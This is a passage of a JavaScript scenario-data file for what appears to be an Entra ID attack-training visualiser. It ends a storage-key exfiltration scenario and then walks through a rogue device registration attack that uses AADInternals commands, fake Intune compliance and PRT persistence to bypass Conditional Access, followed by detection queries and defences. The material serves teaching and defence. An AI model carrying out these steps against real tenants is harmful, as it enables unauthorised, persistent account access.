    logMessage: "DEFENSE: (1) Disable Shared Key authorization: az storage account update --allow-shared-key-access false — forces all data-plane access through Entra ID RBAC; eliminates the listKeys attack path. (2) Enforce via Azure Policy: 'Storage accounts should prevent shared key access'. (3) Disable anonymous public access at tenant level: az storage account update --allow-blob-public-access false, enforced via Policy. (4) Use User Delegation SAS (signed with Entra credentials, revocable per-user) instead of account-key SAS. (5) Enable Microsoft Defender for Storage for anomaly detection and malware scanning. (6) Scan git history and CI artifacts for SAS URI leaks using truffleHog or gitleaks.",
    logType: "info",
    action: () => highlightElement("ent_kv"),
  },
  {
    logMessage: "IMPACT: A Reader-role compromise escalates directly to full data-plane access — reading, downloading, and exfiltrating all blobs across all containers — without any additional privilege escalation step. Storage accounts frequently contain sensitive artifacts: database backups, application configs with embedded credentials, deployment secrets, audit logs. The listKeys vector is silent in most SIEM configurations unless Storage activity logging is explicitly enabled.",
    logType: "attack",
    action: () => { highlightElement("ent_kv"); highlightElement("ent_attacker"); addTemporaryEdge("ent_kv", "ent_attacker", "azurerm", "Data exfil complete"); },
  },
];

// ── 20. Malicious Device Join — CA Bypass via Rogue Device Registration ──
export const entraMaliciousDeviceJoinScenario = [
  {
    scenarioName: "Attack: Malicious Device Join — Conditional Access Bypass via Rogue Device Registration",
    logMessage: "Attacker Goal: Register a rogue device into the target Entra ID tenant using any compromised user account (no admin privilege required), then exploit the registered device identity to bypass Conditional Access policies that enforce corporate device ownership or device compliance. Optionally fake Intune MDM enrollment to satisfy 'require compliant device' CA controls. Originally documented by Dr. Azure AD; used in real 2022 campaigns; still fully functional in 2026.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker has valid credentials for any Entra ID user — Alice (alice@corp.onmicrosoft.com) in this scenario. Alice holds no Entra admin roles. Attacker tools: AADInternals (PowerShell) or any HTTP client capable of constructing a device registration POST. Tenant must NOT have restricted 'Users may register devices' to None or a scoped group (many tenants still leave this at default: All).",
    logType: "setup",
    action: () => highlightElement("ent_user1", stepDelay, "compromised"),
  },
  {
    logMessage: "Attacker enumerates target Conditional Access policies to understand the device-based grant controls in scope. GET https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies with Alice's delegated token. Response reveals policies that include grantControls.builtInControls: ['compliantDevice'] or ['domainJoinedDevice'] — these are the CA controls this attack targets.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /conditionalAccess/policies"),
  },
  {
    logMessage: "Attacker: import AADInternals. Acquire Device Registration Service access token for Alice's account: Get-AADIntAccessTokenForAADJoin -SaveToCache. This uses the well-known public client ID 29d9ed98-a469-4536-ade2-f981bc1d605e (Microsoft Device Registration) — no client secret needed, this is a public OAuth2 client. The token targets the Device Registration Service (https://enterpriseregistration.windows.net).",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "Get device registration token"),
  },
  {
    logMessage: "Attacker: Join-AADIntDeviceToAzureAD -DeviceName 'Ash-Laptop' -DeviceType 'Windows' -OSVersion '10.0.19045.3324'. AADInternals internally generates an RSA device key pair and an RSA transport key pair, then POSTs to https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=1.0 with Alice's token, the public device key, public transport key, and the requested device properties. No special Entra role is consumed.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "POST /EnrollmentServer/device/"),
  },
  {
    logMessage: "Entra ID Device Registration Service: validates Alice's token, confirms Alice is within device quota (default 50 per user), generates a device object (deviceId GUID), issues an X.509 device certificate signed by the tenant's device certificate authority, and returns the certificate to the attacker. The device appears in the Entra admin center under Devices as 'Azure AD Joined'. Alice is listed as the device owner.",
    logType: "oidc",
    action: () => { highlightElement("ent_dev1", stepDelay, "compromised"); addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "Device cert returned"); },
  },
  {
    logMessage: "Attacker: Generate a Primary Refresh Token (PRT) for the rogue device. Get-AADIntUserPRTToken using the new device certificate and transport key. A PRT is issued because the device is now a recognized Entra object. The PRT carries deviceId='Ash-Laptop', but the device is not Intune-enrolled and not marked compliant — it satisfies 'domain joined device' (Azure AD Joined) type policies but NOT 'require compliant device' policies at this stage.",
    logType: "prt",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "prt", "PRT for rogue device"),
  },
  {
    logMessage: "CA bypass — 'Require device to be marked as joined to organization': The rogue device satisfies this control immediately. Access tokens issued with this PRT carry the rogue deviceId claim. Any CA policy using only 'domainJoinedDevice' as the grant control is bypassed. The attacker authenticates as Alice from the attacker's own machine while appearing to Entra as a recognized corporate device.",
    logType: "attack",
    action: () => { highlightElement("ent_user1"); addTemporaryEdge("ent_attacker", "ent_m365", "msgraph", "CA bypass — org device satisfied"); },
  },
  {
    logMessage: "Extension — fake Intune compliance to bypass 'Require compliant device' CA (2024 research, still valid 2026): AADInternals can simulate an Intune/MDM enrollment for the rogue device: Set-AADIntDeviceCompliant. This sends a fake MDM enrollment request to the Intune service using the device certificate. Intune marks the device object as 'compliant' without actually managing or evaluating the device's security posture. The 'require compliant device' CA grant control is then satisfied.",
    logType: "attack",
    action: () => highlightElement("ent_dev1"),
  },
  {
    logMessage: "CA bypass — 'Require compliant device': After fake MDM enrollment the device object shows IsCompliant=true in Entra ID. Tokens issued for this device now carry intuneMDMCompliant=true. ALL CA policies based on device compliance are bypassed. Microsoft confirmed this behavior (MSRC VULN-123240) as 'by design': the Company Portal app is intentionally excluded from CA device-compliance enforcement so legitimate unmanaged devices can enroll — attackers exploit the same FOCI exclusion path.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "msgraph", "CA bypass — compliant device satisfied"),
  },
  {
    logMessage: "Persistence via PRT: The rogue device's PRT is valid for up to 90 days and automatically renewed on use. The attacker retains authenticated access to Alice's account from any machine as long as the rogue device object exists in Entra ID. Even if Alice's password is rotated, PRT-derived tokens remain valid until the device registration is explicitly revoked or PRT expiry.",
    logType: "prt",
    action: () => { highlightElement("ent_attacker"); highlightElement("ent_user1"); },
  },
  {
    logMessage: "DETECTION: Entra ID Audit Log — AuditEvent 'Register device' or 'Add registered owner to device' with actor = Alice and new device not matching any known corporate asset name, serial, or MDM enrollment record. Sign-in logs: Device Registration Service (ResourceDisplayName='Device Registration Service') sign-ins from unexpected IPs or user agents. Sentinel KQL: AuditLogs | where OperationName == 'Register device' | where InitiatedBy.user.userPrincipalName !in (expected_admins) | project TimeGenerated, DeviceName=TargetResources[0].displayName, Actor=InitiatedBy.user.userPrincipalName, IP=InitiatedBy.user.ipAddress.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "DEFENSE: (1) Restrict device registration — Entra admin center > Devices > Device Settings > 'Users may register devices' → None or a scoped admin group. Eliminates self-service registration for regular users. (2) Require MFA for device registration — Conditional Access > New policy > User action: 'Register or join devices' > Grant: Require MFA. Adds a MFA barrier before registration (requires attacker to also bypass MFA). (3) Reduce device quota — max devices per user from 50 to 5-10 for standard users. (4) Require Hybrid Azure AD Join in CA — attackers cannot fake hybrid join because it requires on-premises AD domain membership and Entra Connect sync; significantly stronger than 'Azure AD Joined' or 'compliant device' controls alone. (5) Enable Token Protection (Conditional Access > Session: 'Require token protection') — cryptographically binds tokens to the registering device's private key via PoP; attacker cannot replay tokens off the device. (6) Monitor Device Registration Service access in Sentinel.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Any compromised user account (zero admin privileges) enables registration of a rogue device. The rogue device directly satisfies CA policies enforcing corporate device ownership. With one additional AADInternals step, it also satisfies compliance-based CA policies — a control many organizations treat as their primary conditional access defense. PRT-based access provides persistent, MFA-bypassing authentication to M365, Azure, and any resource gated by those CA policies. Real-world use: Storm-0867 / BEC campaigns (2022) used this exact chain: phish user → register device → bypass CA → launch internal phishing with trusted device context.",
    logType: "attack",
    action: () => { highlightElement("ent_user1"); highlightElement("ent_attacker"); highlightElement("ent_m365"); },
  },
];
